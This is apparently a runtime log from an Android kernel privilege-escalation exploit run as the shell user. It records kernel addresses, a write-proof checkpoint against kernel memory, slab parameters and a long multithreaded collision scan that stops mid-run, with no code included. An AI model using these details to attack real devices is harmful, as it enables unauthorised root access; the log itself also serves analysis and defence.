===== preload.so crash-safe log =====
path=/storage/emulated/0/Download/.temp/log_1788950835.txt tmp=/data/local/tmp/.temp/log_1788950835.txt pid=14380 uid=2000
1788950836.084 14380 [+] preload starting pid=14380
1788950836.086 14380 [+] startup context pid=14380 uid=2000 euid=2000 gid=2000 egid=2000 attr=u:r:shell:s0 enforce=1
1788950836.087 14380 [+] build config pid=14380 label=pd2238_os6_163150_w10 slide=pselect main=pselect
1788950836.092 14380 [+] p0 profile pid=14380 phys_offset=0000000040000000 kernel_phys_load=0000000040000000 delta=0000000000000000 init_task=ffffffc00aaec240 root_tg=ffffffc00ad33100
1788950836.094 14380 [+] direct-map base=ffffff8040000000 slide=0000000000000000
1788950836.095 14380 [+] ckpt: WRITE-PROOF armed bootid_store=ffffff8042ee9110 bootid_buf=ffffff8042ee910d before=572969d4-57e7-49b4-8a9a-e53a242f9978 (odd: leaked scratch, even: aligned bootid+3)
1788950838.118 14380 [*] parameters cpu (16) mm_struct sz (3c0) mm slab order (3) thread cnt (8) collisions (16) mte disabled
1788950840.705 14380 [*] pile-up verified: approx_time=2398
1788950840.707 14380 [*] start finding collisisons
1788950840.709 14380 [*] target    000000793f0080c8
1788950858.351 14380 [*] [  0] tested 300000 candidates, scanning=0xffffff8010bdb480
1788950858.351 14380 [*] [  3] tested 100000 candidates, scanning=0xffffff9805948f00
1788950858.348 14380 [*] [  7] tested 100000 candidates, scanning=0xffffffb805948f00
1788950858.354 14380 [*] [  4] tested 200000 candidates, scanning=0xffffffa00b2921c0
1788950858.349 14380 [*] [  2] tested 200000 candidates, scanning=0xffffff900b2921c0
1788950858.352 14380 [*] [  1] tested 200000 candidates, scanning=0xffffff880b2921c0
1788950858.353 14380 [*] [  5] tested 300000 candidates, scanning=0xffffffa810bdb480
1788950858.354 14380 [*] [  6] tested 200000 candidates, scanning=0xffffffb00b2921c0
1788950858.358 14380 [*] [  4] tested 300000 candidates, scanning=0xffffffa010bdb480
1788950858.354 14380 [*] [  0] tested 400000 candidates, scanning=0xffffff8016524740
1788950858.355 14380 [*] [  3] tested 200000 candidates, scanning=0xffffff980b2921c0
1788950858.360 14380 [*] [  1] tested 300000 candidates, scanning=0xffffff8810bdb480
1788950858.356 14380 [*] [  7] tested 200000 candidates, scanning=0xffffffb80b2921c0
1788950858.359 14380 [*] [  2] tested 300000 candidates, scanning=0xffffff9010bdb480
1788950858.361 14380 [*] [  6] tested 300000 candidates, scanning=0xffffffb010bdb480
1788950858.361 14380 [*] [  5] tested 400000 candidates, scanning=0xffffffa816524740
1788950858.362 14380 [*] [  4] tested 400000 candidates, scanning=0xffffffa016524740
1788950858.363 14380 [*] [  3] tested 300000 candidates, scanning=0xffffff9810bdb480
1788950858.364 14380 [*] [  1] tested 400000 candidates, scanning=0xffffff8816524740
1788950858.364 14380 [*] [  0] tested 500000 candidates, scanning=0xffffff801be6da00
1788950858.365 14380 [*] [  7] tested 300000 candidates, scanning=0xffffffb810bdb480
1788950858.366 14380 [*] [  2] tested 400000 candidates, scanning=0xffffff9016524740
1788950858.367 14380 [*] [  6] tested 400000 candidates, scanning=0xffffffb016524740
1788950858.368 14380 [*] [  5] tested 500000 candidates, scanning=0xffffffa81be6da00
1788950858.368 14380 [*] [  4] tested 500000 candidates, scanning=0xffffffa01be6da00
1788950858.369 14380 [*] [  3] tested 400000 candidates, scanning=0xffffff9816524740
1788950858.371 14380 [*] [  1] tested 500000 candidates, scanning=0xffffff881be6da00
1788950858.371 14380 [*] [  0] tested 600000 candidates, scanning=0xffffff80217b6cc0
1788950858.372 14380 [*] [  7] tested 400000 candidates, scanning=0xffffffb816524740
1788950858.374 14380 [*] [  6] tested 500000 candidates, scanning=0xffffffb01be6da00
1788950858.373 14380 [*] [  2] tested 500000 candidates, scanning=0xffffff901be6da00
1788950858.375 14380 [*] [  5] tested 600000 candidates, scanning=0xffffffa8217b6cc0
1788950858.376 14380 [*] [  4] tested 600000 candidates, scanning=0xffffffa0217b6cc0
1788950858.381 14380 [*] [  0] tested 700000 candidates, scanning=0xffffff80270fff80
1788950858.377 14380 [*] [  3] tested 500000 candidates, scanning=0xffffff981be6da00
1788950858.380 14380 [*] [  1] tested 600000 candidates, scanning=0xffffff88217b6cc0
1788950858.383 14380 [*] [  2] tested 600000 candidates, scanning=0xffffff90217b6cc0
1788950858.381 14380 [*] [  7] tested 500000 candidates, scanning=0xffffffb81be6da00
1788950858.382 14380 [*] [  6] tested 600000 candidates, scanning=0xffffffb0217b6cc0
1788950858.383 14380 [*] [  5] tested 700000 candidates, scanning=0xffffffa8270fff80
1788950858.385 14380 [*] [  4] tested 700000 candidates, scanning=0xffffffa0270fff80
1788950858.384 14380 [*] [  0] tested 800000 candidates, scanning=0xffffff802ca48f00
1788950858.385 14380 [*] [  3] tested 600000 candidates, scanning=0xffffff98217b6cc0
1788950858.386 14380 [*] [  1] tested 700000 candidates, scanning=0xffffff88270fff80
1788950858.387 14380 [*] [  2] tested 700000 candidates, scanning=0xffffff90270fff80
1788950858.388 14380 [*] [  6] tested 700000 candidates, scanning=0xffffffb0270fff80
1788950858.388 14380 [*] [  5] tested 800000 candidates, scanning=0xffffffa82ca48f00
1788950858.391 14380 [*] [  7] tested 600000 candidates, scanning=0xffffffb8217b6cc0
1788950858.397 14380 [*] [  2] tested 800000 candidates, scanning=0xffffff902ca48f00
1788950858.393 14380 [*] [  0] tested 900000 candidates, scanning=0xffffff80323921c0
1788950858.393 14380 [*] [  4] tested 800000 candidates, scanning=0xffffffa02ca48f00
1788950858.394 14380 [*] [  3] tested 700000 candidates, scanning=0xffffff98270fff80
1788950858.395 14380 [*] [  1] tested 800000 candidates, scanning=0xffffff882ca48f00
1788950858.400 14380 [*] [  7] tested 700000 candidates, scanning=0xffffffb8270fff80
1788950858.398 14380 [*] [  6] tested 800000 candidates, scanning=0xffffffb02ca48f00
1788950858.398 14380 [*] [  5] tested 900000 candidates, scanning=0xffffffa8323921c0
1788950858.403 14380 [*] [  1] tested 900000 candidates, scanning=0xffffff88323921c0
1788950858.400 14380 [*] [  2] tested 900000 candidates, scanning=0xffffff90323921c0
1788950858.401 14380 [*] [  4] tested 900000 candidates, scanning=0xffffffa0323921c0
1788950858.403 14380 [*] [  0] tested 1000000 candidates, scanning=0xffffff8037cdb480
1788950858.403 14380 [*] [  3] tested 800000 candidates, scanning=0xffffff982ca48f00
1788950858.404 14380 [*] [  6] tested 900000 candidates, scanning=0xffffffb0323921c0
1788950858.405 14380 [*] [  7] tested 800000 candidates, scanning=0xffffffb82ca48f00
1788950858.407 14380 [*] [  5] tested 1000000 candidates, scanning=0xffffffa837cdb480
1788950858.408 14380 [*] [  1] tested 1000000 candidates, scanning=0xffffff8837cdb480
1788950858.413 14380 [*] [  3] tested 900000 candidates, scanning=0xffffff98323921c0
1788950858.411 14380 [*] [  2] tested 1000000 candidates, scanning=0xffffff9037cdb480
1788950858.414 14380 [*] [  6] tested 1000000 candidates, scanning=0xffffffb037cdb480
1788950858.412 14380 [*] [  4] tested 1000000 candidates, scanning=0xffffffa037cdb480
1788950858.418 14380 [*] [  2] tested 1100000 candidates, scanning=0xffffff903d624740
1788950858.415 14380 [*] [  0] tested 1100000 candidates, scanning=0xffffff803d624740
1788950858.415 14380 [*] [  7] tested 900000 candidates, scanning=0xffffffb8323921c0
1788950858.416 14380 [*] [  5] tested 1100000 candidates, scanning=0xffffffa83d624740
1788950858.417 14380 [*] [  1] tested 1100000 candidates, scanning=0xffffff883d624740
1788950858.419 14380 [*] [  3] tested 1000000 candidates, scanning=0xffffff9837cdb480
1788950858.420 14380 [*] [  6] tested 1100000 candidates, scanning=0xffffffb03d624740
1788950858.422 14380 [*] [  2] tested 1200000 candidates, scanning=0xffffff9042f6da00
1788950858.424 14380 [*] [  5] tested 1200000 candidates, scanning=0xffffffa842f6da00
1788950858.424 14380 [*] [  0] tested 1200000 candidates, scanning=0xffffff8042f6da00
1788950858.425 14380 [*] [  4] tested 1100000 candidates, scanning=0xffffffa03d624740
1788950858.423 14380 [*] [  7] tested 1000000 candidates, scanning=0xffffffb837cdb480
1788950858.426 14380 [*] [  3] tested 1100000 candidates, scanning=0xffffff983d624740
1788950858.430 14380 [*] [  4] tested 1200000 candidates, scanning=0xffffffa042f6da00
1788950858.427 14380 [*] [  6] tested 1200000 candidates, scanning=0xffffffb042f6da00
1788950858.430 14380 [*] [  7] tested 1100000 candidates, scanning=0xffffffb83d624740
1788950858.428 14380 [*] [  2] tested 1300000 candidates, scanning=0xffffff90488b6cc0
1788950858.431 14380 [*] [  0] tested 1300000 candidates, scanning=0xffffff80488b6cc0
1788950858.428 14380 [*] [  1] tested 1200000 candidates, scanning=0xffffff8842f6da00
1788950858.431 14380 [*] [  5] tested 1300000 candidates, scanning=0xffffffa8488b6cc0
1788950858.434 14380 [*] [  6] tested 1300000 candidates, scanning=0xffffffb0488b6cc0
1788950858.432 14380 [*] [  3] tested 1200000 candidates, scanning=0xffffff9842f6da00
1788950858.433 14380 [*] [  4] tested 1300000 candidates, scanning=0xffffffa0488b6cc0
1788950858.434 14380 [*] [  7] tested 1200000 candidates, scanning=0xffffffb842f6da00
1788950858.436 14380 [*] [  0] tested 1400000 candidates, scanning=0xffffff804e1fff80
1788950858.436 14380 [*] [  1] tested 1300000 candidates, scanning=0xffffff88488b6cc0
1788950858.436 14380 [*] [  2] tested 1400000 candidates, scanning=0xffffff904e1fff80
1788950858.437 14380 [*] [  5] tested 1400000 candidates, scanning=0xffffffa84e1fff80
1788950858.439 14380 [*] [  6] tested 1400000 candidates, scanning=0xffffffb04e1fff80
1788950858.439 14380 [*] [  3] tested 1300000 candidates, scanning=0xffffff98488b6cc0
1788950858.443 14380 [*] [  1] tested 1400000 candidates, scanning=0xffffff884e1fff80
1788950858.440 14380 [*] [  4] tested 1400000 candidates, scanning=0xffffffa04e1fff80
1788950858.444 14380 [*] [  2] tested 1500000 candidates, scanning=0xffffff9053b48f00
1788950858.442 14380 [*] [  7] tested 1300000 candidates, scanning=0xffffffb8488b6cc0
1788950858.442 14380 [*] [  0] tested 1500000 candidates, scanning=0xffffff8053b48f00
1788950858.445 14380 [*] [  3] tested 1400000 candidates, scanning=0xffffff984e1fff80
1788950858.446 14380 [*] [  1] tested 1500000 candidates, scanning=0xffffff8853b48f00
1788950858.444 14380 [*] [  5] tested 1500000 candidates, scanning=0xffffffa853b48f00
1788950858.446 14380 [*] [  6] tested 1500000 candidates, scanning=0xffffffb053b48f00
1788950858.448 14380 [*] [  2] tested 1600000 candidates, scanning=0xffffff90594921c0
1788950858.448 14380 [*] [  0] tested 1600000 candidates, scanning=0xffffff80594921c0
1788950858.451 14380 [*] [  1] tested 1600000 candidates, scanning=0xffffff88594921c0
1788950858.453 14380 [*] [  2] tested 1700000 candidates, scanning=0xffffff905eddb480
1788950858.449 14380 [*] [  4] tested 1500000 candidates, scanning=0xffffffa053b48f00
1788950858.449 14380 [*] [  3] tested 1500000 candidates, scanning=0xffffff9853b48f00
1788950858.450 14380 [*] [  7] tested 1400000 candidates, scanning=0xffffffb84e1fff80
1788950858.452 14380 [*] [  6] tested 1600000 candidates, scanning=0xffffffb0594921c0
1788950858.452 14380 [*] [  5] tested 1600000 candidates, scanning=0xffffffa8594921c0
1788950858.457 14380 [*] [  4] tested 1600000 candidates, scanning=0xffffffa0594921c0
1788950858.455 14380 [*] [  1] tested 1700000 candidates, scanning=0xffffff885eddb480
1788950858.454 14380 [*] [  0] tested 1700000 candidates, scanning=0xffffff805eddb480
1788950858.458 14380 [*] [  3] tested 1600000 candidates, scanning=0xffffff98594921c0
1788950858.456 14380 [*] [  2] tested 1800000 candidates, scanning=0xffffff9064724740
1788950858.461 14380 [*] [  1] tested 1800000 candidates, scanning=0xffffff8864724740
1788950858.459 14380 [*] [  7] tested 1500000 candidates, scanning=0xffffffb853b48f00
1788950858.463 14380 [*] [  2] tested 1900000 candidates, scanning=0xffffff906a06da00
1788950858.459 14380 [*] [  6] tested 1700000 candidates, scanning=0xffffffb05eddb480
1788950858.460 14380 [*] [  4] tested 1700000 candidates, scanning=0xffffffa05eddb480
1788950858.461 14380 [*] [  5] tested 1700000 candidates, scanning=0xffffffa85eddb480
1788950858.462 14380 [*] [  0] tested 1800000 candidates, scanning=0xffffff8064724740
1788950858.463 14380 [*] [  3] tested 1700000 candidates, scanning=0xffffff985eddb480
1788950858.464 14380 [*] [  1] tested 1900000 candidates, scanning=0xffffff886a06da00
1788950858.466 14380 [*] [  7] tested 1600000 candidates, scanning=0xffffffb8594921c0
1788950858.467 14380 [*] [  2] tested 2000000 candidates, scanning=0xffffff906f9b6cc0
1788950858.468 14380 [*] [  6] tested 1800000 candidates, scanning=0xffffffb064724740
1788950858.470 14380 [*] [  5] tested 1800000 candidates, scanning=0xffffffa864724740
1788950858.470 14380 [*] [  4] tested 1800000 candidates, scanning=0xffffffa064724740
1788950858.470 14380 [*] [  0] tested 1900000 candidates, scanning=0xffffff806a06da00
1788950858.472 14380 [*] [  7] tested 1700000 candidates, scanning=0xffffffb85eddb480
1788950858.475 14380 [*] [  0] tested 2000000 candidates, scanning=0xffffff806f9b6cc0
1788950858.477 14380 [*] [  2] tested 2100000 candidates, scanning=0xffffff90752fff80
1788950858.478 14380 [*] [  6] tested 1900000 candidates, scanning=0xffffffb06a06da00
1788950858.478 14380 [*] [  1] tested 2000000 candidates, scanning=0xffffff886f9b6cc0
1788950858.478 14380 [*] [  7] tested 1800000 candidates, scanning=0xffffffb864724740
1788950858.479 14380 [*] [  5] tested 1900000 candidates, scanning=0xffffffa86a06da00
1788950858.488 14380 [*] [  6] tested 2000000 candidates, scanning=0xffffffb06f9b6cc0
1788950858.479 14380 [*] [  4] tested 1900000 candidates, scanning=0xffffffa06a06da00
1788950858.480 14380 [*] [  0] tested 2100000 candidates, scanning=0xffffff80752fff80
1788950858.480 14380 [*] [  3] tested 1800000 candidates, scanning=0xffffff9864724740
1788950858.482 14380 [*] [  2] tested 2200000 candidates, scanning=0xffffff907ac48f00
1788950858.489 14380 [*] [  1] tested 2100000 candidates, scanning=0xffffff88752fff80
1788950858.490 14380 [*] [  7] tested 1900000 candidates, scanning=0xffffffb86a06da00
1788950858.493 14380 [*] [  0] tested 2200000 candidates, scanning=0xffffff807ac48f00
1788950858.494 14380 [*] [  2] tested 2300000 candidates, scanning=0xffffff90805921c0
1788950858.491 14380 [*] [  5] tested 2000000 candidates, scanning=0xffffffa86f9b6cc0
1788950858.494 14380 [*] [  7] tested 2000000 candidates, scanning=0xffffffb86f9b6cc0
1788950858.494 14380 [*] [  6] tested 2100000 candidates, scanning=0xffffffb0752fff80
1788950858.495 14380 [*] [  3] tested 1900000 candidates, scanning=0xffffff986a06da00
1788950858.495 14380 [*] [  1] tested 2200000 candidates, scanning=0xffffff887ac48f00
1788950858.496 14380 [*] [  4] tested 2000000 candidates, scanning=0xffffffa06f9b6cc0
1788950858.497 14380 [*] [  0] tested 2300000 candidates, scanning=0xffffff80805921c0
1788950858.498 14380 [*] [  2] tested 2400000 candidates, scanning=0xffffff9085edb480
1788950858.502 14380 [*] [  4] tested 2100000 candidates, scanning=0xffffffa0752fff80
1788950858.498 14380 [*] [  5] tested 2100000 candidates, scanning=0xffffffa8752fff80
1788950858.499 14380 [*] [  7] tested 2100000 candidates, scanning=0xffffffb8752fff80
1788950858.500 14380 [*] [  3] tested 2000000 candidates, scanning=0xffffff986f9b6cc0
1788950858.501 14380 [*] [  1] tested 2300000 candidates, scanning=0xffffff88805921c0
1788950858.503 14380 [*] [  6] tested 2200000 candidates, scanning=0xffffffb07ac48f00
1788950858.504 14380 [*] [  0] tested 2400000 candidates, scanning=0xffffff8085edb480
1788950858.505 14380 [*] [  2] tested 2500000 candidates, scanning=0xffffff908b824740
1788950858.507 14380 [*] [  7] tested 2200000 candidates, scanning=0xffffffb87ac48f00
1788950858.505 14380 [*] [  4] tested 2200000 candidates, scanning=0xffffffa07ac48f00
1788950858.509 14380 [*] [  3] tested 2100000 candidates, scanning=0xffffff98752fff80
1788950858.508 14380 [*] [  1] tested 2400000 candidates, scanning=0xffffff8885edb480
1788950858.509 14380 [*] [  6] tested 2300000 candidates, scanning=0xffffffb0805921c0
1788950858.509 14380 [*] [  5] tested 2200000 candidates, scanning=0xffffffa87ac48f00
1788950858.510 14380 [*] [  0] tested 2500000 candidates, scanning=0xffffff808b824740
1788950858.511 14380 [*] [  2] tested 2600000 candidates, scanning=0xffffff909116da00
1788950858.513 14380 [*] [  7] tested 2300000 candidates, scanning=0xffffffb8805921c0
1788950858.513 14380 [*] [  4] tested 2300000 candidates, scanning=0xffffffa0805921c0
1788950858.515 14380 [*] [  3] tested 2200000 candidates, scanning=0xffffff987ac48f00
1788950858.515 14380 [*] [  1] tested 2500000 candidates, scanning=0xffffff888b824740
1788950858.515 14380 [*] [  6] tested 2400000 candidates, scanning=0xffffffb085edb480
1788950858.516 14380 [*] [  5] tested 2300000 candidates, scanning=0xffffffa8805921c0
1788950858.520 14380 [*] [  4] tested 2400000 candidates, scanning=0xffffffa085edb480
1788950858.517 14380 [*] [  0] tested 2600000 candidates, scanning=0xffffff809116da00
1788950858.518 14380 [*] [  2] tested 2700000 candidates, scanning=0xffffff9096ab6cc0
1788950858.519 14380 [*] [  7] tested 2400000 candidates, scanning=0xffffffb885edb480
1788950858.521 14380 [*] [  3] tested 2300000 candidates, scanning=0xffffff98805921c0
1788950858.522 14380 [*] [  6] tested 2500000 candidates, scanning=0xffffffb08b824740
1788950858.522 14380 [*] [  1] tested 2600000 candidates, scanning=0xffffff889116da00
1788950858.523 14380 [*] [  5] tested 2400000 candidates, scanning=0xffffffa885edb480
1788950858.524 14380 [*] [  0] tested 2700000 candidates, scanning=0xffffff8096ab6cc0
1788950858.525 14380 [*] [  2] tested 2800000 candidates, scanning=0xffffff909c3fff80
1788950858.526 14380 [*] [  6] tested 2600000 candidates, scanning=0xffffffb09116da00
1788950858.527 14380 [*] [  7] tested 2500000 candidates, scanning=0xffffffb88b824740
1788950858.527 14380 [*] [  1] tested 2700000 candidates, scanning=0xffffff8896ab6cc0
1788950858.524 14380 [*] [  4] tested 2500000 candidates, scanning=0xffffffa08b824740
1788950858.527 14380 [*] [  5] tested 2500000 candidates, scanning=0xffffffa88b824740
1788950858.528 14380 [*] [  3] tested 2400000 candidates, scanning=0xffffff9885edb480
1788950858.528 14380 [*] [  2] tested 2900000 candidates, scanning=0xffffff90a1d48f00
1788950858.529 14380 [*] [  0] tested 2800000 candidates, scanning=0xffffff809c3fff80
1788950858.534 14380 [*] [  7] tested 2600000 candidates, scanning=0xffffffb89116da00
1788950858.530 14380 [*] [  6] tested 2700000 candidates, scanning=0xffffffb096ab6cc0
1788950858.535 14380 [*] [  1] tested 2800000 candidates, scanning=0xffffff889c3fff80
1788950858.535 14380 [*] [  5] tested 2600000 candidates, scanning=0xffffffa89116da00
1788950858.536 14380 [*] [  3] tested 2500000 candidates, scanning=0xffffff988b824740
1788950858.540 14380 [*] [  7] tested 2700000 candidates, scanning=0xffffffb896ab6cc0
1788950858.537 14380 [*] [  0] tested 2900000 candidates, scanning=0xffffff80a1d48f00
1788950858.538 14380 [*] [  2] tested 3000000 candidates, scanning=0xffffff90a76921c0
1788950858.539 14380 [*] [  4] tested 2600000 candidates, scanning=0xffffffa09116da00
1788950858.541 14380 [*] [  6] tested 2800000 candidates, scanning=0xffffffb09c3fff80
1788950858.544 14380 [*] [  7] tested 2800000 candidates, scanning=0xffffffb89c3fff80
1788950858.542 14380 [*] [  1] tested 2900000 candidates, scanning=0xffffff88a1d48f00
1788950858.543 14380 [*] [  5] tested 2700000 candidates, scanning=0xffffffa896ab6cc0
1788950858.543 14380 [*] [  3] tested 2600000 candidates, scanning=0xffffff989116da00
1788950858.546 14380 [*] [  0] tested 3000000 candidates, scanning=0xffffff80a76921c0
1788950858.549 14380 [*] [  7] tested 2900000 candidates, scanning=0xffffffb8a1d48f00
1788950858.547 14380 [*] [  2] tested 3100000 candidates, scanning=0xffffff90acfdb480
1788950858.547 14380 [*] [  4] tested 2700000 candidates, scanning=0xffffffa096ab6cc0
1788950858.548 14380 [*] [  6] tested 2900000 candidates, scanning=0xffffffb0a1d48f00
1788950858.554 14380 [*] [  2] tested 3200000 candidates, scanning=0xffffff90b2924740
1788950858.550 14380 [*] [  1] tested 3000000 candidates, scanning=0xffffff88a76921c0
1788950858.550 14380 [*] [  5] tested 2800000 candidates, scanning=0xffffffa89c3fff80
1788950858.551 14380 [*] [  0] tested 3100000 candidates, scanning=0xffffff80acfdb480
1788950858.552 14380 [*] [  3] tested 2700000 candidates, scanning=0xffffff9896ab6cc0
1788950858.560 14380 [*] [  6] tested 3000000 candidates, scanning=0xffffffb0a76921c0
1788950858.553 14380 [*] [  7] tested 3000000 candidates, scanning=0xffffffb8a76921c0
1788950858.555 14380 [*] [  4] tested 2800000 candidates, scanning=0xffffffa09c3fff80
1788950858.562 14380 [*] [  5] tested 2900000 candidates, scanning=0xffffffa8a1d48f00
1788950858.562 14380 [*] [  0] tested 3200000 candidates, scanning=0xffffff80b2924740
1788950858.560 14380 [*] [  1] tested 3100000 candidates, scanning=0xffffff88acfdb480
1788950858.560 14380 [*] [  2] tested 3300000 candidates, scanning=0xffffff90b826da00
1788950858.562 14380 [*] [  3] tested 2800000 candidates, scanning=0xffffff989c3fff80
1788950858.564 14380 [*] [  7] tested 3100000 candidates, scanning=0xffffffb8acfdb480
1788950858.565 14380 [*] [  4] tested 2900000 candidates, scanning=0xffffffa0a1d48f00
1788950858.566 14380 [*] [  5] tested 3000000 candidates, scanning=0xffffffa8a76921c0
1788950858.566 14380 [*] [  0] tested 3300000 candidates, scanning=0xffffff80b826da00
1788950858.568 14380 [*] [  2] tested 3400000 candidates, scanning=0xffffff90bdbb6cc0
1788950858.568 14380 [*] [  1] tested 3200000 candidates, scanning=0xffffff88b2924740
1788950858.568 14380 [*] [  3] tested 2900000 candidates, scanning=0xffffff98a1d48f00
1788950858.568 14380 [*] [  6] tested 3100000 candidates, scanning=0xffffffb0acfdb480
1788950858.570 14380 [*] [  5] tested 3100000 candidates, scanning=0xffffffa8acfdb480
1788950858.570 14380 [*] [  0] tested 3400000 candidates, scanning=0xffffff80bdbb6cc0
1788950858.570 14380 [*] [  7] tested 3200000 candidates, scanning=0xffffffb8b2924740
1788950858.572 14380 [*] [  2] tested 3500000 candidates, scanning=0xffffff90c34fff80
1788950858.572 14380 [*] [  1] tested 3300000 candidates, scanning=0xffffff88b826da00
1788950858.572 14380 [*] [  4] tested 3000000 candidates, scanning=0xffffffa0a76921c0
1788950858.573 14380 [*] [  3] tested 3000000 candidates, scanning=0xffffff98a76921c0
1788950858.574 14380 [*] [  6] tested 3200000 candidates, scanning=0xffffffb0b2924740
1788950858.575 14380 [*] [  5] tested 3200000 candidates, scanning=0xffffffa8b2924740
1788950858.576 14380 [*] [  0] tested 3500000 candidates, scanning=0xffffff80c34fff80
1788950858.576 14380 [*] [  7] tested 3300000 candidates, scanning=0xffffffb8b826da00
1788950858.578 14380 [*] [  1] tested 3400000 candidates, scanning=0xffffff88bdbb6cc0
1788950858.580 14380 [*] [  3] tested 3100000 candidates, scanning=0xffffff98acfdb480
1788950858.577 14380 [*] [  2] tested 3600000 candidates, scanning=0xffffff90c8e48f00
1788950858.580 14380 [*] [  6] tested 3300000 candidates, scanning=0xffffffb0b826da00
1788950858.582 14380 [*] [  4] tested 3100000 candidates, scanning=0xffffffa0acfdb480
1788950858.582 14380 [*] [  5] tested 3300000 candidates, scanning=0xffffffa8b826da00
1788950858.584 14380 [*] [  7] tested 3400000 candidates, scanning=0xffffffb8bdbb6cc0
1788950858.585 14380 [*] [  3] tested 3200000 candidates, scanning=0xffffff98b2924740
1788950858.585 14380 [*] [  6] tested 3400000 candidates, scanning=0xffffffb0bdbb6cc0
1788950858.583 14380 [*] [  0] tested 3600000 candidates, scanning=0xffffff80c8e48f00
1788950858.587 14380 [*] [  5] tested 3400000 candidates, scanning=0xffffffa8bdbb6cc0
1788950858.586 14380 [*] [  2] tested 3700000 candidates, scanning=0xffffff90ce7921c0
1788950858.588 14380 [*] [  1] tested 3500000 candidates, scanning=0xffffff88c34fff80
1788950858.589 14380 [*] [  3] tested 3300000 candidates, scanning=0xffffff98b826da00
1788950858.590 14380 [*] [  6] tested 3500000 candidates, scanning=0xffffffb0c34fff80
